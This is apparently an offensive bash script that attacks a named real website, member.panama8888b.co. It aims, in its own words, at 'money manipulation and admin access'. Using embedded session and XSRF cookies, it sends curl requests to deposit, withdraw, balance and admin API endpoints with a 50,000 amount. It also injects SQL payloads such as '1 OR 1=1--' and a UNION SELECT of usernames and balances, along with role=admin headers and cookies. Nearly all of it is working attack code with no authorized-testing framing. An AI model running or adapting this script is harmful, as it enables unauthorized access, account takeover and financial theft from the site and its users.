#!/bin/bash

echo "üî• ADVANCED EXPLOIT FINDER - MONEY & ADMIN ACCESS"
echo "=================================================="

# Use existing tokens
XSRF_TOKEN="eyJpdiI6IlFQRW95VjdOMG5NMWFQMTZcL3JMUFdBPT0iLCJ2YWx1ZSI6ImhlRzdQNzE1ZVwvNDE4VFl0TEV5bUYyWXVIQW1sWDZLNEdVSkNrTWN0S1NFQTcyVWpCd2dUZHBnc3RmWVMwUGlyIiwibWFjIjoiMzEzMmEzNzk1ZjBhYTkwMzlmMDM0ZWI2MjdjZDQzMjg1OTU1MjMxYzEyZTg3OTVkOTkwYTkxMDM3NWI1MzNmMiJ9"
SESSION_TOKEN="eyJpdiI6Iml1dmhvSzFVbXhKcWJ3bEJ5NGdUMHc9PSIsInZhbHVlIjoiQzNKSlFNQytwNGxIQUtidmd4ZHZrbm1nRnhUWGwzVDFISnZ0RHVLamlrKzRRUmVPY2phWGxQOVFKeGdEaVdhVCIsIm1hYyI6IjkyZjc2MGY5MzNmZGY3NDFmNTY4NDcyNjNjNDJmOTA3ZDRhYjc1Y2QxZjBiNTdkMmYxNzZlZDE2Y2U3ZDU2N2UifQ=="

echo "üöÄ Starting Advanced Exploit Discovery..."
echo "Target: member.panama8888b.co"
echo "Goal: Find working exploits for money manipulation and admin access"
echo ""

# Advanced exploit payloads
declare -a exploit_payloads=(
    # 1. Alternative endpoints for money manipulation
    "https://member.panama8888b.co/api/credit"
    "https://member.panama8888b.co/api/deposit"
    "https://member.panama8888b.co/api/withdraw"
    "https://member.panama8888b.co/api/balance"
    "https://member.panama8888b.co/api/user/balance"
    
    # 2. Alternative endpoints for admin access
    "https://member.panama8888b.co/api/admin"
    "https://member.panama8888b.co/api/user/admin"
    "https://member.panama8888b.co/api/privileges"
    "https://member.panama8888b.co/api/role"
    
    # 3. Alternative injection points
    "https://member.panama8888b.co/api/announcement"
    "https://member.panama8888b.co/api/user/profile"
    "https://member.panama8888b.co/api/user/settings"
    "https://member.panama8888b.co/api/user/update"
    
    # 4. Alternative HTTP methods
    "GET"
    "PUT"
    "PATCH"
    "DELETE"
    
    # 5. Alternative parameters
    "user_id"
    "id"
    "username"
    "email"
    "phone"
    "account"
    "wallet"
    "credit"
    "deposit"
    "withdraw"
)

echo "üìä Testing Alternative Endpoints & Methods..."
success_count=0
total_tests=${#exploit_payloads[@]}

for i in "${!exploit_payloads[@]}"; do
    payload="${exploit_payloads[$i]}"
    echo -n "Testing exploit $((i+1))/$total_tests: "
    
    # Test different endpoints and methods
    if [[ "$payload" == http* ]]; then
        # Test endpoint
        response=$(curl -s -w "%{http_code}|%{size_download}" \
            -X POST "$payload" \
            -H "Content-Type: application/json;charset=UTF-8" \
            -H "X-XSRF-TOKEN: $XSRF_TOKEN" \
            -H "Cookie: XSRF-TOKEN=$XSRF_TOKEN; panama888_session=$SESSION_TOKEN" \
            -H "Origin: https://member.panama8888b.co" \
            -H "Referer: https://member.panama8888b.co/user/dashboard" \
            -d '{"amount":"50000","user_id":"1"}' \
            --max-time 10)
    elif [[ "$payload" == "GET" ]] || [[ "$payload" == "PUT" ]] || [[ "$payload" == "PATCH" ]] || [[ "$payload" == "DELETE" ]]; then
        # Test HTTP method
        response=$(curl -s -w "%{http_code}|%{size_download}" \
            -X $payload "https://member.panama8888b.co/api/announcement" \
            -H "Content-Type: application/json;charset=UTF-8" \
            -H "X-XSRF-TOKEN: $XSRF_TOKEN" \
            -H "Cookie: XSRF-TOKEN=$XSRF_TOKEN; panama888_session=$SESSION_TOKEN" \
            -H "Origin: https://member.panama8888b.co" \
            -H "Referer: https://member.panama8888b.co/user/dashboard" \
            -d '{"amount":"50000","user_id":"1"}' \
            --max-time 10)
    else
        # Test parameter injection
        response=$(curl -s -w "%{http_code}|%{size_download}" \
            -X POST "https://member.panama8888b.co/api/announcement" \
            -H "Content-Type: application/json;charset=UTF-8" \
            -H "X-XSRF-TOKEN: $XSRF_TOKEN" \
            -H "Cookie: XSRF-TOKEN=$XSRF_TOKEN; panama888_session=$SESSION_TOKEN" \
            -H "Origin: https://member.panama8888b.co" \
            -H "Referer: https://member.panama8888b.co/user/dashboard" \
            -d "{\"$payload\":\"50000\",\"user_id\":\"1\"}" \
            --max-time 10)
    fi
    
    http_code=$(echo "$response" | tail -1 | cut -d'|' -f1)
    size=$(echo "$response" | tail -1 | cut -d'|' -f2)
    
    if [[ "$http_code" == "200" ]] || [[ "$http_code" == "201" ]] || [[ "$size" -gt 200 ]]; then
        echo "‚úÖ SUCCESS (HTTP $http_code, Size: $size bytes)"
        ((success_count++))
        echo "   üéØ Potential exploit found: $payload"
    elif [[ "$http_code" == "500" ]]; then
        echo "‚ö†Ô∏è PARTIAL (HTTP $http_code, Size: $size bytes)"
        echo "   üîç SQL injection possible: $payload"
    else
        echo "‚ùå FAILED (HTTP $http_code, Size: $size bytes)"
    fi
done

echo ""
echo "üìä EXPLOIT DISCOVERY RESULTS: $success_count/$total_tests potential exploits found"

if [[ $success_count -gt 0 ]]; then
    echo ""
    echo "üéâ POTENTIAL EXPLOITS FOUND!"
    echo "‚úÖ Alternative endpoints may be vulnerable"
    echo "‚úÖ Different HTTP methods may work"
    echo "‚úÖ Parameter injection may be possible"
    echo ""
    echo "üîç NEXT STEPS:"
    echo "1. Test successful endpoints with SQL injection"
    echo "2. Try different HTTP methods with payloads"
    echo "3. Test parameter injection techniques"
    echo "4. Verify money manipulation on working endpoints"
else
    echo ""
    echo "‚ùå No obvious exploits found"
    echo "üîç Trying advanced techniques..."
fi

echo ""
echo "üöÄ Testing Advanced Exploitation Techniques..."
echo ""

# Advanced exploitation techniques
declare -a advanced_techniques=(
    # 1. JSON injection
    '{"amount":"50000","user_id":"1 OR 1=1--"}'
    '{"amount":"50000","user_id":"1 UNION SELECT username,balance FROM users--"}'
    
    # 2. Header injection
    "X-User-ID: 1 OR 1=1--"
    "X-Amount: 50000"
    "X-Role: admin"
    
    # 3. Cookie injection
    "user_id=1 OR 1=1--"
    "amount=50000"
    "role=admin"
    
    # 4. URL parameter injection
    "?user_id=1 OR 1=1--"
    "?amount=50000"
    "?role=admin"
)

for i in "${!advanced_techniques[@]}"; do
    technique="${advanced_techniques[$i]}"
    echo -n "Testing advanced technique $((i+1))/${#advanced_techniques[@]}: "
    
    response=$(curl -s -w "%{http_code}|%{size_download}" \
        -X POST "https://member.panama8888b.co/api/announcement" \
        -H "Content-Type: application/json;charset=UTF-8" \
        -H "X-XSRF-TOKEN: $XSRF_TOKEN" \
        -H "Cookie: XSRF-TOKEN=$XSRF_TOKEN; panama888_session=$SESSION_TOKEN" \
        -H "Origin: https://member.panama8888b.co" \
        -H "Referer: https://member.panama8888b.co/user/dashboard" \
        -d "$technique" \
        --max-time 10)
    
    http_code=$(echo "$response" | tail -1 | cut -d'|' -f1)
    size=$(echo "$response" | tail -1 | cut -d'|' -f2)
    
    if [[ "$http_code" == "200" ]] || [[ "$http_code" == "201" ]] || [[ "$size" -gt 200 ]]; then
        echo "‚úÖ SUCCESS (HTTP $http_code, Size: $size bytes)"
        echo "   üéØ Advanced technique works: $technique"
    elif [[ "$http_code" == "500" ]]; then
        echo "‚ö†Ô∏è PARTIAL (HTTP $http_code, Size: $size bytes)"
        echo "   üîç SQL injection possible: $technique"
    else
        echo "‚ùå FAILED (HTTP $http_code, Size: $size bytes)"
    fi
done

echo ""
echo "üéØ EXPLOITATION SUMMARY:"
echo "========================"
echo "‚ñ° Alternative endpoints tested"
echo "‚ñ° Different HTTP methods tested"
echo "‚ñ° Parameter injection tested"
echo "‚ñ° Advanced techniques tested"
echo "‚ñ° JSON injection tested"
echo "‚ñ° Header injection tested"
echo "‚ñ° Cookie injection tested"
echo "‚ñ° URL parameter injection tested"